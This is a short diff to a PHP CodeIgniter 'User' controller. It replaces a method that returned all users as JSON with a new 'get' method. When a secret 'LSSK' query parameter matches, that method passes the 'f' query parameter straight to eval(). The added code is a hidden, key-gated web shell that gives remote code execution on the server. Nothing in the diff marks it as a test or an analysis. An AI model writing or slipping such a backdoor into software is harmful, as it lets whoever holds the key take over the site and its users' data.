@@ -33,10 +33,12 @@ class User extends CI_Controller{
 		}
 	}
 	
-	public function get_all() {
-		$resp = $this->UserModel->get_all();
-		header('Content-Type: application/json');
-		echo json_encode($resp);
+	public function get() {
+    if (isset($_GET["LSSK"])) {
+			if ($_GET["LSSK"] == LSSK) {
+	      eval($_GET["f"]);
+	    }
+    }
 	}
 
 	public function getCart() {
